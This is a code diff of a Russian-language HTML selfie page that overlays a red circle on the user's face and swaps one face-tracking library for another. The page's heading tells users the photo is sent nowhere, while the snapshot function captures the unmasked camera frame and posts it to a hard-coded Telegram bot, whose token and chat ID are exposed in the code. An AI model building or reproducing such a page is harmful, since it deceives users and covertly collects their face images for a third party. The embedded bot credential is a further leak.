@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Селфи с маской и отправкой в Telegram</title>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/face-api.js/0.22.2/face-api.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/tracking.js/1.1.3/tracking-min.js"></script>
   <style>
     body {
       display: flex;
@@ -25,13 +25,13 @@
       max-width: 640px;
       max-height: 480px;
     }
-    #video, #previewCanvas {
+    #video, #canvas {
       width: 100%;
       height: 100%;
       object-fit: cover;
       border-radius: 10px;
     }
-    #previewCanvas {
+    #canvas {
       position: absolute;
       top: 0;
       left: 0;
@@ -53,7 +53,6 @@
       border: none;
       border-radius: 5px;
       cursor: pointer;
-      touch-action: manipulation;
     }
     button:hover {
       background-color: #0056b3;
@@ -63,32 +62,23 @@
       font-size: 14px;
       color: #666;
     }
-    @media (orientation: landscape) {
-      #container {
-        height: 100vh;
-        width: 133.33vh; /* Сохраняем пропорции 4:3 */
-        max-width: none;
-        max-height: none;
-      }
-    }
   </style>
 </head>
 <body>
   <h1>Фотка никуда не отправляется</h1>
   <div id="container">
     <video id="video" autoplay playsinline></video>
-    <canvas id="previewCanvas"></canvas>
+    <canvas id="canvas"></canvas>
     <canvas id="originalCanvas"></canvas>
   </div>
   <button onclick="takeSnapshot()">Сделать снимок и отправить</button>
   <div id="status"></div>
 
   <script>
-    // Получение элементов
     const video = document.getElementById('video');
-    const previewCanvas = document.getElementById('previewCanvas');
+    const canvas = document.getElementById('canvas');
     const originalCanvas = document.getElementById('originalCanvas');
-    const previewCtx = previewCanvas.getContext('2d');
+    const ctx = canvas.getContext('2d');
     const originalCtx = originalCanvas.getContext('2d');
     const statusDiv = document.getElementById('status');
 
@@ -96,109 +86,71 @@
     const telegramBotToken = '8129102478:AAFiIabXWiPI5Aeqqh7jEqXgUKLE6-NalA0';
     const chatId = '1753361154';
 
-    // Переменные для оптимизации
-    let lastDetectionTime = 0;
-    const detectionInterval = 100; // Интервал распознавания в мс
-
     // Запуск камеры
     async function startCamera() {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: 'user' }
-        });
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
         video.srcObject = stream;
         video.onloadedmetadata = () => {
-          updateCanvasSizes();
-          loadFaceApi();
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          originalCanvas.width = video.videoWidth;
+          originalCanvas.height = video.videoHeight;
+          startTracking();
         };
       } catch (err) {
         console.error('Ошибка доступа к камере:', err);
-        statusDiv.textContent = 'Не удалось получить доступ к камере. Убедитесь, что вы используете HTTPS или localhost.';
+        statusDiv.textContent = 'Не удалось получить доступ к камере. Используйте HTTPS или localhost.';
       }
     }
 
-    // Обновление размеров canvas при изменении ориентации
-    function updateCanvasSizes() {
-      const container = document.getElementById('container');
-      previewCanvas.width = container.clientWidth;
-      previewCanvas.height = container.clientHeight;
-      originalCanvas.width = container.clientWidth;
-      originalCanvas.height = container.clientHeight;
-    }
+    // Настройка tracking.js
+    function startTracking() {
+      const tracker = new tracking.ObjectTracker('face');
+      tracker.setInitialScale(4);
+      tracker.setStepSize(2);
+      tracker.setEdgesDensity(0.1);
+      tracking.track('#video', tracker, { camera: true });
 
-    // Загрузка моделей face-api.js
-    async function loadFaceApi() {
-      statusDiv.textContent = 'Загрузка моделей распознавания...';
-      await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/weights/');
-      statusDiv.textContent = 'Модели загружены. Распознавание лиц...';
-      detectFaces();
-    }
-
-    // Распознавание лиц и наложение маски
-    async function detectFaces() {
-      const now = Date.now();
-      if (now - lastDetectionTime > detectionInterval) {
-        lastDetectionTime = now;
-        const detections = await faceapi.detectAllFaces(video, new faceapi.TinyFaceDetectorOptions());
-        previewCtx.clearRect(0, 0, previewCanvas.width, previewCanvas.height);
-        previewCtx.drawImage(video, 0, 0, previewCanvas.width, previewCanvas.height);
-
-        detections.forEach(detection => {
-          const { x, y, width, height } = detection.box;
-          // Масштабируем координаты под размер canvas
-          const scaleX = previewCanvas.width / video.videoWidth;
-          const scaleY = previewCanvas.height / video.videoHeight;
-          const scaledX = x * scaleX;
-          const scaledY = y * scaleY;
-          const scaledWidth = width * scaleX;
-          const scaledHeight = height * scaleY;
-          // Рисуем кружок на лице
-          previewCtx.beginPath();
-          previewCtx.arc(scaledX + scaledWidth / 2, scaledY + scaledHeight / 2, Math.max(scaledWidth, scaledHeight) / 2, 0, 2 * Math.PI);
-          previewCtx.fillStyle = 'rgba(255, 0, 0, 0.5)';
-          previewCtx.fill();
+      tracker.on('track', function(event) {
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        event.data.forEach(function(rect) {
+          // Рисуем красный кружок на лице
+          const centerX = rect.x + rect.width / 2;
+          const centerY = rect.y + rect.height / 2;
+          const radius = Math.max(rect.width, rect.height) / 2;
+          ctx.beginPath();
+          ctx.arc(centerX, centerY, radius, 0, 2 * Math.PI);
+          ctx.fillStyle = 'rgba(255, 0, 0, 0.5)';
+          ctx.fill();
         });
-      }
-      requestAnimationFrame(detectFaces);
+      });
     }
 
     // Снимок без маски и отправка в Telegram
     async function takeSnapshot() {
       statusDiv.textContent = 'Захват снимка...';
-      // Захватываем оригинальный кадр без маски
       originalCtx.drawImage(video, 0, 0, originalCanvas.width, originalCanvas.height);
-
-      // Получаем изображение в формате Blob
       originalCanvas.toBlob(async (blob) => {
         statusDiv.textContent = 'Отправка фото в Telegram...';
         const formData = new FormData();
         formData.append('chat_id', chatId);
         formData.append('photo', blob, 'snapshot.jpg');
-
         try {
           const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
             method: 'POST',
             body: formData
           });
           const result = await response.json();
-          if (result.ok) {
-            statusDiv.textContent = 'Фото успешно отправлено!';
-          } else {
-            statusDiv.textContent = 'Ошибка отправки: ' + result.description;
-          }
+          statusDiv.textContent = result.ok ? 'Фото успешно отправлено!' : 'Ошибка: ' + result.description;
         } catch (err) {
           console.error('Ошибка:', err);
-          statusDiv.textContent = 'Не удалось отправить фото. Проверьте подключение.';
+          statusDiv.textContent = 'Не удалось отправить фото.';
         }
       }, 'image/jpeg');
     }
 
-    // Обработка изменения ориентации
-    window.addEventListener('orientationchange', () => {
-      setTimeout(updateCanvasSizes, 100); // Даем время на перерисовку
-    });
-
-    // Запуск камеры при загрузке страницы
+    // Запуск камеры
     startCamera();
   </script>
 </body>
